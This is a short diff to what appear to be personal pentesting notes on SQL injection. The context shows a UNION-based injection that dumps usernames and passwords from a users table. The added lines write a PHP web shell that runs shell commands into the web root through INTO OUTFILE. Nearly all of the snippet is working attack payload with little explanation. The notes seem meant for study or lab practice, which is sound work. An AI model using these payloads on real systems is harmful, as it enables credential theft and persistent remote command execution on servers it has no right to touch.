@@ -15,7 +15,9 @@ UNION BASED SQLI
 
   Able to run commands like this
 ' UNION SELECT null, username, password, description, null FROM users -- //
-
+  
+  Can also insert write a .php file with a webshell
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
 BASIC SQLI
 
